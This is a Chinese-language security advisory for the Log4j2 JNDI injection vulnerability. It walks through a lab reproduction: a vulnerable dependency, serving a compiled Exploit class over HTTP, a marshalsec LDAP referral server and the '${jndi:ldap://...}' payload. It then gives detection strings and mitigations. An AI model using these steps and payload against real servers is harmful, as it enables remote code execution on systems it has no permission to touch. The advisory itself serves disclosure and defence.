简介
==

Apache Log4j是Apache的一个开源项目，Apache log4j2是Log4j的升级版本，我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。

漏洞描述
====

Log4j2中存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。经验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等众多组件与大型应用均受影响。鉴于此漏洞危害巨大，利用门槛极低。

影响范围
====

Apache Log4j 2.x &lt; 2.15.0-rc2

当前漏洞状态
======

技术细节-已公开  
PoC状态-已公开  
EXP状态-已公开  
在野利用-已发现

风险评级
====

紧急较大事件

漏洞复现：
=====

**1、复现pom文件，需要引入的jar：**

```html
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version>
    </dependency>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-api</artifactId>
        <version>2.14.1</version>
    </dependency>
</dependencies>
```

**2、POC内容：**

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7dbe412e6717d8321e2afd45ef23a1d08ea57cb7.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7dbe412e6717d8321e2afd45ef23a1d08ea57cb7.png)

**3、Exploit内容**

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-160406e18deccd0835881dbf6c56856daa2df11c.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-160406e18deccd0835881dbf6c56856daa2df11c.png)

**4、使用java编译一个class文件**

javac Exploit.java

**5、使用python开启http服务(其他也行)**

将Exploit.class文件放入http服务目录(在哪个文件夹下启动，显示的就是当前文件夹的文件，默认是 8000，指定了端口之后，访问就是指定的端口)

python3
=======

python -m http.server 4444

python2
=======

python -m SimpleHTTPServer 4444

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2bf6325858af083f57be5ff97b07df3ae0003269.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2bf6325858af083f57be5ff97b07df3ae0003269.png)

**6、marshalsec工具启动LDAP服务**   
不指定端口：

```html
marshalsec-master\marshalsec-master\target>java -cp marshalsec-0.0.3-SNAPSHOT- all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:4444/#Exploit 不指定端口默认是1389 Exploit是文件名称 
```

指定端口：

```html
marshalsec-master\marshalsec-master\target>java -cp marshalsec-0.0.3-SNAPSHOT- all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exploit 1099 
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-306c0712c97d737424caab80dfbd6015812d77c1.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-306c0712c97d737424caab80dfbd6015812d77c1.png)

**7、执行poc**  
运行poc中的代码可以看到Exp中的代码已经被运行

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4c47433fea3eba07ea41970c973a984a1ad47ece.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4c47433fea3eba07ea41970c973a984a1ad47ece.png)

首先需要在公网执行marshalsec启动LDAP服务，目的是为了让目标能够读取到我们的Exp ,参数中提交 payload: "${jndi:ldap://localhost:1389/Exploit}"。

**8、利用条件**  
当功能传输参数直接输出到日志时，可以构造payload，直接访问。

处置建议
====

**1、漏洞排查**  
排查应用是否引入了 Apache Log4j2 Jar 包，若存在依赖引入，则可能存在漏  
洞影响。

- （a）相关用户可根据 Java JAR 解压后是否存在 org/apache/logging/log4j 相关路径结构，判断是否使用了存在漏洞的组件，若存在相关 Java 程序包，则极可能存在该漏洞。

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f5d642974d6c9164118b499574bff700335acb66.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f5d642974d6c9164118b499574bff700335acb66.png)

- （b）若程序使用 Maven 打包，查看项目的 pom.xml 文件中是否存在如下图所示的相关字段，若版本号为小于 2.15.0-rc2，则存在该漏洞。

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6e127825ca7fe0f0ff1362e25d283ef3966a60cc.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6e127825ca7fe0f0ff1362e25d283ef3966a60cc.png)

- （c）若程序使用 gradle 打包，查看 build.gradle 编译配置文件，若在dependencies 部分存在 org.apache.logging.log4j 相关字段，且版本号为小于 2.15.0-rc2，则存在该漏洞。

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b30eb172555ce54ca6985d0e489558711335b8dd.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b30eb172555ce54ca6985d0e489558711335b8dd.png)

**2、攻击排查**

- 攻击者在利用前通常采用 dnslog 方式进行扫描、探测，对于常见  
    利用方式可通过应用系统报错日志中的  
    "javax.naming.CommunicationException"、  
    "javax.naming.NamingException: problem generating object using object factory"、"Error looking up JNDI resource"关键字进行排查。
- 流量排查：攻击者的数据包中可能存在：“${jndi:rmi”、  
    “${jndi:ldap” 字样，推荐使用奇安信网神网站应用安全云防护系  
    统全流量或 WAF 设备进行检索排查。

**3、修复建议**  
**（1）升级到最新版本：**  
请联系厂商获取修复后的官方版本：<https://github.com/apache/logginglog4j2> ；  
请尽快升级 Apache Log4j2 所有相关应用到最新的 log4j-2.15.0-rc2 版本，地址：<https://github.com/apache/logginglog4j2/releases/tag/log4j-2.15.0-rc2> 或采用奇安信产品解决方案来防护此漏洞。

**（2）缓解措施：**

- 添加 jvm 启动参数 -Dlog4j2.formatMsgNoLookups=true。
- 在应用程序的 classpath 下添加 log4j2.component.properties 配置文件文件，文件内容：log4j2.formatMsgNoLookups=True。
- 设置系统环境变量 FORMAT\_MESSAGES\_PATTERN\_DISABLE\_LOOKUPS 设置为 true。
- 建议 JDK 使用 11.0.1、8u191、7u201、6u211 及以上的高版本。
- 限制受影响应用对外访问互联网。